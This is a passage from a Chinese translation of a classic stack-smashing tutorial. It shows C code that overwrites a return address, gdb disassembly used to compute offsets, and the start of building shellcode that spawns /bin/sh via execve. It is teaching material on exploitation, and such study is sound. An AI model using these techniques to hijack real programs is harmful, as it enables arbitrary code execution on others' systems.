<BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 现在试着修改我们第一个例子, 让它可以覆盖返回地址, 而且使它可以执行任意代码.<BR>堆栈中在buffer1[]之前的是SFP, SFP之前是返回地址. ret从buffer1[]的结尾算起是4个<BR>字节.应该记住的是buffer1[]实际上是2个字即8个字节长. 因此返回地址从buffer1[]的开<BR>头算起是12个字节. 我们会使用这种方法修改返回地址, 跳过函数调用后面的赋值语句<BR>'x=1;', 为了做到这一点我们把返回地址加上8个字节. 代码看起来是这样的:<BR><BR>example3.c:<BR>------------------------------------------------------------------------------<BR>void function(int a, int b, int c) {<BR>&nbsp;&nbsp; char buffer1[5];<BR>&nbsp;&nbsp; char buffer2[10];<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = buffer1 + 12;<BR>&nbsp;&nbsp; (*ret) += 8;<BR>}<BR><BR>void main() {<BR>&nbsp; int x;<BR><BR>&nbsp; x = 0;<BR>&nbsp; function(1,2,3);<BR>&nbsp; x = 1;<BR>&nbsp; printf("%d\n",x);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们把buffer1[]的地址加上12, 所得的新地址是返回地址储存的地方. 我们想跳过<BR>赋值语句而直接执行printf调用. 如何知道应该给返回地址加8个字节呢? 我们先前使用<BR>过一个试验值(比如1), 编译该程序, 祭出工具gdb:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gdb example3<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(no debugging symbols found)...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000490 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000491 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000493 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x4,%esp<BR>0x8000496 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)<BR>0x800049d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x3<BR>0x800049f &lt;main+15&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x2<BR>0x80004a1 &lt;main+17&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x1<BR>0x80004a3 &lt;main+19&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000470 &lt;function&gt;<BR>0x80004a8 &lt;main+24&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0xc,%esp<BR>0x80004ab &lt;main+27&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,0xfffffffc(%ebp)<BR>0x80004b2 &lt;main+34&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffffc(%ebp),%eax<BR>0x80004b5 &lt;main+37&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x80004b6 &lt;main+38&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x80004f8<BR>0x80004bb &lt;main+43&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000378 &lt;printf&gt;<BR>0x80004c0 &lt;main+48&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0x8,%esp<BR>0x80004c3 &lt;main+51&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x80004c5 &lt;main+53&gt;:&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x80004c6 &lt;main+54&gt;:&nbsp;&nbsp;&nbsp; ret<BR>0x80004c7 &lt;main+55&gt;:&nbsp;&nbsp;&nbsp; nop<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们看到当调用function()时, RET会是0x8004a8, 我们希望跳过在0x80004ab的赋值<BR>指令. 下一个想要执行的指令在0x8004b2. 简单的计算告诉我们两个指令的距离为8字节.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell Code<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 现在我们可以修改返回地址即可以改变程序执行的流程, 我们想要执行什么程序呢?<BR>在大多数情况下我们只是希望程序派生出一个shell. 从这个shell中, 可以执行任何我<BR>们所希望的命令. 但是如果我们试图破解的程序里并没有这样的代码可怎么办呢? 我们<BR>怎么样才能将任意指令放到程序的地址空间中去呢? 答案就是把想要执行的代码放到我<BR>们想使其溢出的缓冲区里, 并且覆盖函数的返回地址, 使其指向这个缓冲区. 假定堆栈<BR>的起始地址为0xFF, S代表我们想要执行的代码, 堆栈看起来应该是这样:<BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |____________________________|<BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 派生出一个shell的C语言代码是这样的:<BR>&nbsp; <BR>shellcode.c<BR>-----------------------------------------------------------------------------<BR>#include &lt;stdio.h&gt;<BR><BR>void main() {<BR>&nbsp;&nbsp; char *name[2];<BR><BR>&nbsp;&nbsp; name[0] = "/bin/sh";<BR>&nbsp;&nbsp; name[1] = NULL;<BR>&nbsp;&nbsp; execve(name[0], name, NULL);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 为了查明这程序变成汇编后是个什么样子, 我们编译它, 然后祭出调试工具gdb. 记住<BR>在编译的时候要使用-static标志, 否则系统调用execve的真实代码就不会包括在汇编中,<BR>取而代之的是对动态C语言库的一个引用, 真正的代码要到程序加载的时候才会联入.<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c<BR>[aleph1]$ gdb shellcode<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x8,%esp<BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x80027b8,0xfffffff8(%ebp)<BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)<BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x0<BR>0x8000146 &lt;main+22&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x800014a &lt;main+26&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>0x800014d &lt;main+29&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x80002bc &lt;__execve&gt;<BR>0x8000153 &lt;main+35&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0xc,%esp<BR>0x8000156 &lt;main+38&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x8000158 &lt;main+40&gt;:&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x8000159 &lt;main+41&gt;:&nbsp;&nbsp;&nbsp; ret<BR>End of assembler dump.<BR>(gdb) disassemble __execve<BR>Dump of assembler code for function __execve:<BR>0x80002bc &lt;__execve&gt;:&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x80002bd &lt;__execve+1&gt;: movl&nbsp;&nbsp; %esp,%ebp<BR>0x80002bf &lt;__execve+3&gt;: pushl&nbsp; %ebx<BR>0x80002c0 &lt;__execve+4&gt;: movl&nbsp;&nbsp; $0xb,%eax<BR>0x80002c5 &lt;__execve+9&gt;: movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR>0x80002c8 &lt;__execve+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xc(%ebp),%ecx<BR>0x80002cb &lt;__execve+15&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x10(%ebp),%edx<BR>0x80002ce &lt;__execve+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x80002d0 &lt;__execve+20&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,%edx<BR>0x80002d2 &lt;__execve+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; testl&nbsp; %edx,%edx<BR>0x80002d4 &lt;__execve+24&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnl&nbsp;&nbsp;&nbsp; 0x80002e6 &lt;__execve+42&gt;<BR>0x80002d6 &lt;__execve+26&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; negl&nbsp;&nbsp; %edx<BR>0x80002d8 &lt;__execve+28&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %edx<BR>0x80002d9 &lt;__execve+29&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8001a34 &lt;__normal_errno_location&gt;<BR>0x80002de &lt;__execve+34&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %edx<BR>0x80002df &lt;__execve+35&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %edx,(%eax)<BR>0x80002e1 &lt;__execve+37&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xffffffff,%eax<BR>0x80002e6 &lt;__execve+42&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebx<BR>0x80002e7 &lt;__execve+43&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x80002e9 &lt;__execve+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x80002ea &lt;__execve+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret<BR>0x80002eb &lt;__execve+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop<BR>End of assembler dump.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 下面我们看看这里究竟发生了什么事情. 先从main开始研究:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x8,%esp<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这是例程的准备工作. 首先保存老的帧指针, 用当前的堆栈指针作为新的帧指针,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 然后为局部变量保留空间. 这里是:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *name[2];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 即2个指向字符串的指针. 指针的长度是一个字, 所以这里保留2个字(8个字节)的<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空间.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x80027b8,0xfffffff8(%ebp)<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把0x80027b8(字串"/bin/sh"的地址)这个值复制到name[]中的第一个指针, 这<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 等价于:&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name[0] = "/bin/sh";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把值0x0(NULL)复制到name[]中的第二个指针, 这等价于:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name[1] = NULL;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 对execve()的真正调用从下面开始:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x0<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把execve()的参数以从后向前的顺序压入堆栈中, 这里从NULL开始.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000146 &lt;main+22&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把name[]的地址放到EAX寄存器中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 接着就把name[]的地址压入堆栈中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014a &lt;main+26&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把字串"/bin/sh"的地址放到EAX寄存器中<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014d &lt;main+29&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 接着就把字串"/bin/sh"的地址压入堆栈中<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x80002bc &lt;__execve&gt;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 调用库例程execve(). 这个调用指令把IP(指令指针)压入堆栈中.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 现在到了execve(). 要注意我们使用的是基于Intel的Linux系统. 系统调用的细节随<BR>操作系统和CPU的不同而不同. 有的把参数压入堆栈中, 有的保存在寄存器里. 有的使用<BR>软中断跳入内核模式, 有的使用远调用(far call). Linux把传给系统调用的参数保存在<BR>寄存器里, 并且使用软中断跳入内核模式.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>------------------------------------------------------------------------------<BR>0x80002bc &lt;__execve&gt;:&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x80002bd &lt;__execve+1&gt;: movl&nbsp;&nbsp; %esp,%ebp<BR>0x80002bf &lt;__execve+3&gt;: pushl&nbsp; %ebx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 例程的准备工作.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x80002c0 &lt;__execve+4&gt;: movl&nbsp;&nbsp; $0xb,%eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把0xb(十进制的11)放入寄存器EAX中(原文误为堆栈). 0xb是系统调用表的索引<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11就是execve.<BR><BR>0x80002c5 &lt;__execve+9&gt;: movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把"/bin/sh"的地址放到寄存器EBX中.<BR><BR>0x80002c8 &lt;__execve+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xc(%ebp),%ecx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把name[]的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x80002cb &lt;__execve+15&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x10(%ebp),%edx<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把空指针的地址放到寄存器EDX中.<BR><BR>0x80002ce &lt;__execve+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进入内核模式.<BR>------------------------------------------------------------------------------&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp; 由此可见调用execve()也没有什么太多的工作要做, 所有要做的事情总结如下:<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a) 把以NULL结尾的字串"/bin/sh"放到内存某处.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)<BR>.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c) 把0xb放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d) 把字串"/bin/sh"的地址放到寄存器EBX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (注: 原文d和e步骤把EBX和ECX弄反了)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f) 把空长字的地址放到寄存器EDX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g) 执行指令int $0x80. <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 但是如果execve()调用由于某种原因失败了怎么办? 程序会继续从堆栈中读取指令, <BR>这时的堆栈中可能含有随机的数据! 程序执行这样的指令十有八九会core dump. 如果execv<BR>e<BR>调用失败我们还是希望程序能够干净地退出. 为此必须在调用execve之后加入一个exit<BR>系统调用. exit系统调用在汇编语言看起来象什么呢?<BR><BR>exit.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>void main() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o exit -static exit.c<BR>[aleph1]$ gdb exit<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(no debugging symbols found)...<BR>(gdb) disassemble _exit<BR>Dump of assembler code for function _exit:<BR>0x800034c &lt;_exit&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x800034d &lt;_exit+1&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x800034f &lt;_exit+3&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebx<BR>0x8000350 &lt;_exit+4&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,%eax<BR>0x8000355 &lt;_exit+9&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR>0x8000358 &lt;_exit+12&gt;:&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x800035a &lt;_exit+14&gt;:&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffffc(%ebp),%ebx<BR>0x800035d &lt;_exit+17&gt;:&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x800035f &lt;_exit+19&gt;:&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x8000360 &lt;_exit+20&gt;:&nbsp;&nbsp; ret<BR>0x8000361 &lt;_exit+21&gt;:&nbsp;&nbsp; nop<BR>0x8000362 &lt;_exit+22&gt;:&nbsp;&nbsp; nop<BR>0x8000363 &lt;_exit+23&gt;:&nbsp;&nbsp; nop<BR>End of 